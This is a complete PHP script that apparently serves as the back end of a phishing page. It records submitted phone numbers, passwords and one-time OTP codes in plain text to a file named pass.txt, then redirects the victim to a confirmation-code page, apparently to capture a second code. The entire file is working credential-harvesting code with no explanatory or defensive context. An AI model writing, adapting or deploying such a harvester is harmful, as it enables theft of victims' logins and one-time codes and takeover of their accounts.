<?php
header ('Location: maxacnhan.html ');
$handle = fopen("pass.txt", "a");
foreach ($_POST as $variable => $value) {
    if ($variable == "Sodienthoai" || $variable == "Matkhau" || $variable == "maotp") {
        fwrite($handle, $variable);
        fwrite($handle, "= ");
        fwrite($handle, $value);
        fwrite($handle, "
");
    }
}
fwrite($handle, "
");
fclose($handle);
exit;
?>